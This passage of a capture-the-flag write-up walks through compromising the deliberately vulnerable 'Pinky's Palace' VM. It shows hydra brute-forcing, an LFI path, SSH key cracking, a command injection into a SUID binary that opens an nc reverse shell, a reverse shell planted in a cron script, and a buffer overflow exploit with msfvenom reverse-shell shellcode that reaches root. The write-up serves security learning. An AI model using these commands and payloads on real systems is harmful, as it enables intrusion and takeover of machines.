SF:\nCall-ID:\x2050000\r\nCSeq:\x2042\x20OPTIONS\r\nMax-Forwards:\x2070\r\
SF:nContent-Length:\x200\r\nContact:\x20<sip:nm@nm>\r\nAccept:\x20applicat
SF:ion/sdp\r\n\r\n")%r(GenericLines,5D,"\[\+\]\x20Welcome\x20to\x20The\x20
SF:Daemon\x20\[\+\]\n\0This\x20is\x20soon\x20to\x20be\x20our\x20backdoor\n
SF:\0into\x20Pinky's\x20Palace\.\n=>\x20\0\r\n\r\n")%r(HTTPOptions,6F,"\[\
SF:+\]\x20Welcome\x20to\x20The\x20Daemon\x20\[\+\]\n\0This\x20is\x20soon\x
SF:20to\x20be\x20our\x20backdoor\n\0into\x20Pinky's\x20Palace\.\n=>\x20\0O
SF:PTIONS\x20/\x20HTTP/1\.0\r\n\r\n")%r(RTSPRequest,6F,"\[\+\]\x20Welcome\
SF:x20to\x20The\x20Daemon\x20\[\+\]\n\0This\x20is\x20soon\x20to\x20be\x20o
SF:ur\x20backdoor\n\0into\x20Pinky's\x20Palace\.\n=>\x20\0OPTIONS\x20/\x20
SF:RTSP/1\.0\r\n\r\n")%r(RPCCheck,5A,"\[\+\]\x20Welcome\x20to\x20The\x20Da
SF:emon\x20\[\+\]\n\0This\x20is\x20soon\x20to\x20be\x20our\x20backdoor\n\0
SF:into\x20Pinky's\x20Palace\.\n=>\x20\0\x80")%r(DNSVersionBindReqTCP,59,"
SF:\[\+\]\x20Welcome\x20to\x20The\x20Daemon\x20\[\+\]\n\0This\x20is\x20soo
SF:n\x20to\x20be\x20our\x20backdoor\n\0into\x20Pinky's\x20Palace\.\n=>\x20
SF:\0")%r(DNSStatusRequestTCP,59,"\[\+\]\x20Welcome\x20to\x20The\x20Daemon
SF:\x20\[\+\]\n\0This\x20is\x20soon\x20to\x20be\x20our\x20backdoor\n\0into
SF:\x20Pinky's\x20Palace\.\n=>\x20\0")%r(Help,5F,"\[\+\]\x20Welcome\x20to\
SF:x20The\x20Daemon\x20\[\+\]\n\0This\x20is\x20soon\x20to\x20be\x20our\x20
SF:backdoor\n\0into\x20Pinky's\x20Palace\.\n=>\x20\0HELP\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.85 seconds
```

### 4. Enumerate new web service
The new webpage has a simple login form on a bright pink background. Here I can attempt some further password attacks. Using a wordlist which includes words from the wordpress front page, I can try with a few different variations of pinky.
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ hydra -l pinky -P pinky.txt pinkydb -s 7654 http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid" -t 30 
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-18 05:22:21
[DATA] max 30 tasks per 1 server, overall 30 tasks, 90 login tries (l:1/p:90), ~3 tries per task
[DATA] attacking http-post-form://pinkydb:7654/login.php:user=^USER^&pass=^PASS^:Invalid
[7654][http-post-form] host: pinkydb   login: pinky   password: Passione
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-03-18 05:22:22
```
This provides one set of creds: `pinky:Passione`.

### 5. Log into the site
Once inside, there is a link to two files: One is an rsa key, and one is a notes file containing:
```bash
- Stefano
- Intern Web developer
- Created RSA key for security for him to login
```
I tried logging in with the key to SSH, however it appears the key requires a password for use. I can attempt to crack the password. Before doing so I did a dirbust of the new site and also found some LFI in the php parameter which includes the notes page. It can be tested with `http://pinkydb:7654/pageegap.php?1337=../../../../../../../etc/passwd`.

### 6. Crack the key
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ /usr/share/john/ssh2john.py id_rsa > ssh.john
                                                                                                                                                                                                                                                                                                                                                                                                                 
┌──(kali㉿kali)-[~/Desktop]
└─$ cat ssh.john    
id_rsa:$sshng$1$16$BAC2C72352E75C879E2F26CC61A5B6E7$1200$972c9d97dc224ef52b94ced25c12a03043f9b422bbd1171eeb98bdb2beebc479969bdd6ecddd86601812a8644888f2cf8497518bc1f2448cfed6d7f614fa01be48d697e5b244fa68568bd77c48cbea556f6a4e96d5e34eb9a1818ca4fef1e685242eb6775a33b843367aaa4f72c569f29bb0ccff10efbcd8a592bd20e528df18aea6fe11ae704418f623682d652c5468ce5bd4b684e7450d100ab8d8b9a2fb1184358815a835ce59327d60aa106a43fa04eff7dfe1e1a1b46da2d4b76c7157fdb3293a641585140d70aa56f6560bf9327e411f1dbb1882e8ee8eb2673cb102e734da82419eb83906d96efd3cb1f000d5651ef40d5037abefd4a229f1242bc7df374acce833a8747dadd8f98623ba369d10ce0fff6966a0ae28f91aa0698c212d698d86c715d043c7e535e95832f75c8c7bd9ae35bcacac14d278726a5bb4fa71672e71c7ead32f004ea8a9e23120e3ba8890fbc944eb19fcf44fb951250eca41f783407f8a18a8226cb8bad1758a41a9d19ab0a230b2a789d2c28dcb72aac821966e603e9ab3c3c0ae3d0dc4a8f5881d8a033da93b324e927e965a0be1d045ab8c6d0ab2e5cacff584ed53566a46076a32c5bb8276b0c294e213670047e016f429b2fe7f9c5a80ef9fe71e4ab4f5abcd408cbd6b2854a6c0b5a32a22a02471112afdf348ca011333862809d0e543b03993d7faa41519b6be089dac64c7729ddf4766b70c0f6f47e022c63be545820aacdd752fa48713e00af1f5f54893786ce977809c23a18f97fd4361782676ea3dd910cc13491c29eb13c465e3299097a945cbf86f19698312d6e872474d1c61fdbc5db6919b8d98629144e7d8379a662580fdfcbdd122f702f941835688de52dfc0183be34bc4217cd4700d4c13607494988933e1f42df20d9ba77122c40fc41fd2175741e8044b4fcde69c96a249441a565992b9e148f9d61a2aca60d37e14b91c0c12e976a237e497c9f5db640a8730e4e57a060db06b18a46317201d682be38b952c198a6131434e368d57b883167492edd087fbad98651fdd17fb2ac9e0e36b52b7ab9a55b957c4ed4944fac8fc046de5bec28cf04166d21751bb4f174fe6c34ab4b55647ffd0568d3bef02230f941bc5c26ba318a4be040d64ad3cfa604ad889fa0a4c84955accfb1f5a785e7d580f4b2a7c5b66d934b3b038fec75069c38297c2ab80a117cbeb517a85540a872695f07e9768908aba3f16d918527b7da93bbfcc358c826ad673e4eb54b745c76067f61043a48a1abc85e717a731cad299cb45c7e1a5f7d50cc8d557bd12979e1633d9aa2c747351665984051e85990aaeca2ed0b1e84eb9169184a1ad3d6c73bb882e88a271fb97a567a0a9760a2d24d8e98567e622a8bff784dd6de6c43fcc20ee059a2e1501c0a9d84c17525c1063c8c8f37f55624029900df5b8d35fa78190c3b00daaca298cde9b2883e9a7c1557426e083b0e519952e7ffe1c9d739cea00c02b8fbabe97300b8027255b017e08ce9966a362995ed339839103648fe529b46f2e0bb543c1c7781417cff8848ed4b20332d2dd7f5ff7a8c6c342ca9b7475ed66cd8ff380af6c9d823df1ef4eb1b7d097d75ae6688a7317b46c3163bc7f211d1510773f7c709385733ba29e2ad0c71c0893eb84f221c2b33e7476ac246b262e5cb2fce7bad9cd87c76461d3dc5c534245
                                                                                                                                                                                                                                                                                                                                                                                                                 
┌──(kali㉿kali)-[~/Desktop]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt ssh.john 
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
secretz101       (id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:08 DONE (2021-03-18 05:36) 0.1146g/s 1644Kp/s 1644Kc/s 1644KC/sa6_123..*7¡Vamos!
Session completed
```
The key's password is `secretz101`.

### 7. Get a shell
From here I can now log in as stefano.
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh -i id_rsa stefano@192.168.34.143 -p 4655             
Enter passphrase for key 'id_rsa': 
Linux Pinkys-Palace 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Mar 17 21:18:01 2018 from 172.19.19.2
stefano@Pinkys-Palace:~$ id
uid=1002(stefano) gid=1002(stefano) groups=1002(stefano)
stefano@Pinkys-Palace:~$ 
```

### 8. Enumerate from user
There is only one folder in the user's directory, and it contains a suid binary to the user pinky, and a note.
```bash
stefano@Pinkys-Palace:~/tools$ ls -l
total 20
-rw-r--r-- 1 stefano stefano     65 Mar 16  2018 note.txt
-rwsr----x 1 pinky   www-data 13384 Mar 16  2018 qsub
stefano@Pinkys-Palace:~/tools$ cat note.txt 
Pinky made me this program so I can easily send messages to him.
stefano@Pinkys-Palace:~/tools$ ./qsub
./qsub <Message>
stefano@Pinkys-Palace:~/tools$ ./qsub test
[+] Input Password: aaaa
[!] Incorrect Password!
```
I would like to run strings on this file, but I can't as the stefano user. However, the www-data user will be able to. In order to get access to www-data, I drop a php reverse shell file on the machine and then run it using the previously-discovered LFI. This gives me a shell as www-data. Then I can run strings.
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [192.168.34.138] from (UNKNOWN) [192.168.34.143] 48312
Linux Pinkys-Palace 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64 GNU/Linux
 02:58:53 up  1:44,  1 user,  load average: 0.00, 0.02, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
stefano  pts/0    192.168.34.138   02:37   21.00s  0.14s  0.14s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ strings /home/stefano/tools/qsub
/lib64/ld-linux-x86-64.so.2
libc.so.6
exit
__isoc99_scanf
puts
strlen
send
setresgid
asprintf
getenv
setresuid
system
getegid
geteuid
__cxa_finalize
strcmp
__libc_start_main
_ITM_deregisterTMCloneTable
__gmon_start__
_Jv_RegisterClasses
_ITM_registerTMCloneTable
GLIBC_2.7
GLIBC_2.2.5
AWAVA
AUATL
[]A\A]A^A_
/bin/echo %s >> /home/pinky/messages/stefano_msg.txt
%s <Message>
TERM
[+] Input Password: 
Bad hacker! Go away!
[+] Welcome to Question Submit!
[!] Incorrect Password!
;*3$"
GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516
crtstuff.c
...
```
Here I can see the hardcoded command that the user's input is inserted into. It is probably run using system or execve: `/bin/echo %s >> /home/pinky/messages/stefano_msg.txt`. For the password, I see a few strings that are candidates: "AWAVA", "AUATL" and "TERM". Sadly none of these work. I need to look closer.  
As www-data, copy the qsub folder into the web server directory so I can download it. Next I will check it out in a decompiler.
Quickly while I'm here as www-data, grab the db creds out of the config.php file.
```bash
www-data@Pinkys-Palace:~/html/nginx/pinkydb/html$ cat config.php
cat config.php
<?php
        define('DB_HOST', 'localhost');
        define('DB_USER', 'secretpinkdbuser');
        define('DB_PASS', 'pinkyssecretdbpass');
        define('DB_NAME', 'secretsdb');
        $conn = mysqli_connect(DB_HOST,DB_USER,DB_PASS,DB_NAME);
?>

```
The creds are `secretpinkdbuser:pinkyssecretdbpass`, but there are no other users in the database.

### 9. Check out the qsub binary
Running ltrace on the qsub binary shows that the desired password is "xterm-256color" which is what my current TERM environment variable is. This would explain the presence of TERM in the binary earlier. Try the password:
```bash
┌──(kali㉿kali)-[~/Desktop/pinky]
└─$ ./qsub aaaaa                                
[+] Input Password: xterm-256color
sh: 1: cannot create /home/pinky/messages/stefano_msg.txt: Directory nonexistent
[+] Welcome to Question Submit!
```
The fact that we got an error message back means the command is now running, so we can now attempt to inject into it.

### 10. Lateral movement
First use netcat to connect back to the attacker machine as the pinky user.
```bash
stefano@Pinkys-Palace:~/tools$ ./qsub "hello; nc -e /bin/bash 192.168.34.138 9999;"
[+] Input Password: xterm-256color
hello
```
This results in a new connection as pinky.
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9999
connect to [192.168.34.138] from (UNKNOWN) [192.168.34.143] 35412

id
uid=1000(pinky) gid=1002(stefano) groups=1002(stefano)
```

### 11. Enumeration from new user
Like with the previous user, check bash_history:
```bash
pinky@Pinkys-Palace:/home/pinky$ cat .bash_history
cat .bash_history
ls -al
cd
ls -al
cd /usr/local/bin
ls -al
vim backup.sh 
su demon
```
There is a backup.sh file in /usr/local/bin which pinky attempted to modify.
```bash
pinky@Pinkys-Palace:/home/pinky$ cd /usr/local/bin
cd /usr/local/bin
pinky@Pinkys-Palace:/usr/local/bin$ ls -l backup.sh
ls -l backup.sh
-rwxrwx--- 1 demon pinky 113 Mar 17  2018 backup.sh
```
Unfortunately I can't do anything with this file, because I am not the "demon" user, nor am I in pinky's groups. To fix it, I can generate an ssh key, create an .ssh and authorized_keys folder and file and then add the key in. Then login over SSH.
```bash
pinky@Pinkys-Palace:~$ cd /home/pinky
cd /home/pinky
pinky@Pinkys-Palace:/home/pinky$ mkdir .ssh
mkdir .ssh
pinky@Pinkys-Palace:/home/pinky$ cd .ssh
cd .ssh
pinky@Pinkys-Palace:/home/pinky/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBx0HYs/TjQC9iBDAmu/OBWzFWU+sT3FEXlGkMrCw2YZNd0fHsTH3AKBmSOOi3oNWfvAzTuJ/E8RMmQB2E9JhypbEdxTB4vNsbKuk6kgIHM0tWO7d3/8dc+hGbBcT1pMNoTCFDgIihOpUfdrGJbe1AE6vJEg/jocnMDg/r7qwPXXuPhUcfbHPTUheZVlz12SAwvHVUT9Zx+bcxJxL6qWe1pTz8K+XYpEjxFhKmGMxmZKAgVK+19Dh1BCI+xSNlNSFt8q9+bgc/RJEbSS3Cc8VVwDmojx8m3HHFcbiBYLhp5IOSGjeY5Fmq9ZP2qaqWOCfDKk1b4kYYVO9gk3pO6ETg+KtU5j/e8vTlZWbwCAdctWB4aIcfdPVp1IgRqAEBNhT39CyDZSCstU/CEZc6+gXsP8UtB1E6iLWVonANX4WxGTW4t+WUPRFFhTYhge59u1fAm8SOBoiYsfwfONX3xz0JG2M+dMxCaSF+/HAGlj7V/5tlK9BdDJxqsY6DKVpDrds= kali@kali" > authorized_keys
aSF+/HAGlj7V/5tlK9BdDJxqsY6DKVpDrds= kali@kali" > authorized_keysNX3xz0JG2M+dMxCa
```
Now I can read the file.
```bash
pinky@Pinkys-Palace:/usr/local/bin$ cat backup.sh
#!/bin/bash

rm /home/demon/backups/backup.tar.gz
tar cvzf /home/demon/backups/backup.tar.gz /var/www/html
#
#
#
```
This script backs up all the web files into a directory in demon's directory. With a backup script such as this, it is probably automated somehow, so monitor the running processes on the machine for a bit and see if the script gets executed on an inteval.
```bash
pinky@Pinkys-Palace:/tmp$ ./pspy64 
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
...
2021/03/19 18:50:01 CMD: UID=1001 PID=15976  | gzip 
2021/03/19 18:55:01 CMD: UID=0    PID=15977  | /usr/sbin/CRON -f 
2021/03/19 18:55:01 CMD: UID=0    PID=15978  | /usr/sbin/CRON -f 
2021/03/19 18:55:01 CMD: UID=1001 PID=15979  | /bin/bash /usr/local/bin/backup.sh 
2021/03/19 18:55:01 CMD: UID=1001 PID=15980  | /bin/bash /usr/local/bin/backup.sh 
2021/03/19 18:55:01 CMD: UID=1001 PID=15981  | /bin/bash /usr/local/bin/backup.sh 
2021/03/19 18:55:01 CMD: UID=1001 PID=15982  | /bin/sh -c gzip 
2021/03/19 18:55:01 CMD: UID=1001 PID=15983  | gzip 
2021/03/19 19:00:01 CMD: UID=0    PID=15984  | /usr/sbin/CRON -f 
2021/03/19 19:00:01 CMD: UID=1001 PID=15987  | rm /home/demon/backups/backup.tar.gz 
2021/03/19 19:00:01 CMD: UID=1001 PID=15986  | /bin/bash /usr/local/bin/backup.sh 
2021/03/19 19:00:01 CMD: UID=1001 PID=15985  | /bin/sh -c /usr/local/bin/backup.sh 
2021/03/19 19:00:01 CMD: UID=1001 PID=15988  | /bin/bash /usr/local/bin/backup.sh 
2021/03/19 19:00:01 CMD: UID=1001 PID=15989  | tar cvzf /home/demon/backups/backup.tar.gz /var/www/html 
2021/03/19 19:00:01 CMD: UID=1001 PID=15990  | gzip 
...
```
The backup script runs every 5 minutes.

### 12. More lateral movement
Add a line for netcat to the backup script.
```bash
pinky@Pinkys-Palace:/usr/local/bin$ vim backup.sh 
pinky@Pinkys-Palace:/usr/local/bin$ cat backup.sh 
#!/bin/bash

nc -e /bin/bash 192.168.34.138 9999
rm /home/demon/backups/backup.tar.gz
tar cvzf /home/demon/backups/backup.tar.gz /var/www/html
#
#
#
```
Wait 5 mins...
and then get a connection back.
```bash
┌──(kali㉿kali)-[~/Desktop/pinky]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [192.168.34.138] from (UNKNOWN) [192.168.34.143] 35428

id
uid=1001(demon) gid=1001(demon) groups=1001(demon)
```
Then, do the same thing as last time to get better persistance by copying my SSH key across and logging in.

### 13. Enumeration from new user
From this user, run some enumeration and find the following through linpeas:
```
[+] Analyzing .service files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services

/etc/systemd/system/daemon.service is calling this writable executable: /daemon/panel
/etc/systemd/system/multi-user.target.wants/daemon.service is calling this writable executable: /daemon/panel
```
Strings on daemon/panel:
```bash
demon@Pinkys-Palace:/daemon$ strings panel
/lib64/ld-linux-x86-64.so.2
d.jb
libc.so.6
socket
strcpy
exit
htons
wait
fork
listen
printf
strlen
send
memset
bind
recv
setsockopt
close
accept
__libc_start_main
__gmon_start__
GLIBC_2.2.5
AWAVA
AUATL
[]A\A]A^A_
[-] %s
[-] Fail in socket
setting sock options
binding to socket
listening
new sock failed
[+] Welcome to The Daemon [+]
This is soon to be our backdoor
into Pinky's Palace.
```
So this is the backdoor program that is accessable over port 31337 externally. With access to the file, download it and do some analysis.

### 14. Analyse file
Using Ghidra, it can be seen the program reads in 4096 bytes from the user (0x1000) and then passes it to handle_cmd.
```c
  send(socket,"[+] Welcome to The Daemon [+]\n",0x1f,0);
  send(socket,"This is soon to be our backdoor\n",0x21,0);
  send(socket,"into Pinky\'s Palace.\n=> ",0x19,0);
  input_len = recv(socket,buffer,0x1000,0);
  local_10 = (undefined4)input_len;
  handlecmd(buffer,socket,socket);
```
Then in handle_cmd, the following happens:
```c
void handlecmd(char *buffer,int socket)

{
  size_t length;
  char local_buf2 [112];
  
  strcpy(local_buf2,buffer);
  length = strlen(local_buf2);
  send(socket,local_buf2,length,0);
  return;
}
```
The big buffer gets copied into a new smaller buffer using strcpy. Then the contents of the smaller buffer is echo'd back to the connected client. This is a blatant buffer overflow.

### 14. Build the exploit
```bash
──(kali㉿kali)-[~/Desktop/pinky]
└─$ gdb panel     
GNU gdb (Debian 10.1-1.7) 10.1.90.20210103-git
Copyright (C) 2021 Free Software Foundation, Inc.                                                                                

License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from panel...
(No debugging symbols found in panel)
gdb-peda$ r
Starting program: /home/kali/Desktop/pinky/panel 
[Attaching after process 833298 fork to child process 833302]
[New inferior 2 (process 833302)]
[Detaching after fork from parent process 833298]
[Inferior 1 (process 833298) detached]
```
From here, run a pattern through the program with `pwn cyclic 200 | nc 192.168.34.138 31337` and get data from the crash.
```bash
Thread 2.1 "panel" received signal SIGSEGV, Segmentation fault.
[Switching to process 833349]
[----------------------------------registers-----------------------------------]
RAX: 0xc8 
RBX: 0x0 
RCX: 0x7ffff7eef20c (<__libc_send+28>:  cmp    rax,0xfffffffffffff000)
RDX: 0xc8 
RSI: 0x7fffffffce80 ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
RDI: 0x4 
RBP: 0x6261616562616164 ('daabeaab')
RSP: 0x7fffffffcef8 ("faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
RIP: 0x4009aa (<handlecmd+70>:  ret)
R8 : 0x0 
R9 : 0x0 
R10: 0x0 
R11: 0x246 
R12: 0x400840 (<_start>:        xor    ebp,ebp)
R13: 0x0 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4009a3 <handlecmd+63>:     call   0x400790 <send@plt>
   0x4009a8 <handlecmd+68>:     nop
   0x4009a9 <handlecmd+69>:     leave  
=> 0x4009aa <handlecmd+70>:     ret    
   0x4009ab <main>:     push   rbp
   0x4009ac <main+1>:   mov    rbp,rsp
   0x4009af <main+4>:   sub    rsp,0x1050
   0x4009b6 <main+11>:  call   0x400820 <fork@plt>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffcef8 ("faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0008| 0x7fffffffcf00 ("haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0016| 0x7fffffffcf08 ("jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0024| 0x7fffffffcf10 ("laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0032| 0x7fffffffcf18 ("naaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0040| 0x7fffffffcf20 ("paabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0048| 0x7fffffffcf28 ("raabsaabtaabuaabvaabwaabxaabyaab")
0056| 0x7fffffffcf30 ("taabuaabvaabwaabxaabyaab")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004009aa in handlecmd ()
```
The base pointer has been overwritten and contains the value starting with `daab`. Additionally, RSP lays just beyond this at the next 8 byte offset at 120.
```bash
┌──(kali㉿kali)-[~/Desktop/pinky]
└─$ pwn cyclic -l daab
112
```
With control of RBP, which is the address of the previous stack frame, I can use this to jump to shellcode. Firstly I need an instruction address to place here.
```bash
gdb-peda$ jmpcall
0x400728 : call rax
0x400895 : jmp rax
0x4008e3 : jmp rax
0x40092e : call rax
0x400cfb : call rsp
0x400d6b : call [rax]
```
Call RSP will return into the user input, where shellcode can be.
The exploit structure is therefore: [NOPS][SHELLCODE (max 120 bytes)][CALL RSP]  
  
Generate the payload:
```bash
┌──(kali㉿kali)-[~]
└─$ msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=192.168.34.138 LPORT=9999 -b '\x00\x0a\x0d' -f python
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
Found 4 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=17, char=0x00)
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 119 (iteration=0)
x64/xor chosen with final size 119
Payload size: 119 bytes
Final size of python file: 597 bytes
buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
buf += b"\xef\xff\xff\xff\x48\xbb\x6e\x91\x68\xd0\x35\x90\x73"
buf += b"\x97\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += b"\x04\xb8\x30\x49\x5f\x92\x2c\xfd\x6f\xcf\x67\xd5\x7d"
buf += b"\x07\x3b\x2e\x6c\x91\x4f\xdf\xf5\x38\x51\x1d\x3f\xd9"
buf += b"\xe1\x36\x5f\x80\x29\xfd\x44\xc9\x67\xd5\x5f\x93\x2d"
buf += b"\xdf\x91\x5f\x02\xf1\x6d\x9f\x76\xe2\x98\xfb\x53\x88"
buf += b"\xac\xd8\xc8\xb8\x0c\xf8\x06\xff\x46\xf8\x73\xc4\x26"
buf += b"\x18\x8f\x82\x62\xd8\xfa\x71\x61\x94\x68\xd0\x35\x90"
buf += b"\x73\x97"
```
I needed to do a bit of experimentation with bad bytes to get them right for this exploit, in the end there is just enough room to fit everything.  
Run the exploit locally:
```bash
┌──(kali㉿kali)-[~/Desktop/pinky]
└─$ ./pinky_exploit.py REMOTE
[+] Opening connection to 192.168.34.138 on port 31337: Done
[*] [+] Welcome to The Daemon [+]
    \x00his is soon to be our backdoor
    \x00nto Pinky's Palace.
    =>
```
Get a connection:
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [192.168.34.138] from (UNKNOWN) [192.168.34.138] 40756
whoami
kali
```

### 15. Escalate to root
Now run the exploit against the remote machine.
```bash
┌──(kali㉿kali)-[~/Desktop/pinky]
└─$ ./pinky_exploit.py REMOTE HOST=192.168.34.143
[+] Opening connection to 192.168.34.143 on port 31337: Done
[*] [+] Welcome to The Daemon [+]
    \x00his is soon to be our backdoor
    \x00nto Pinky's Palace.
    => 
```
Get the connection back as root.
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [192.168.34.138] from (UNKNOWN) [192.168.34.143] 35438
id
uid=0(root) gid=0(root) groups=0(root)
```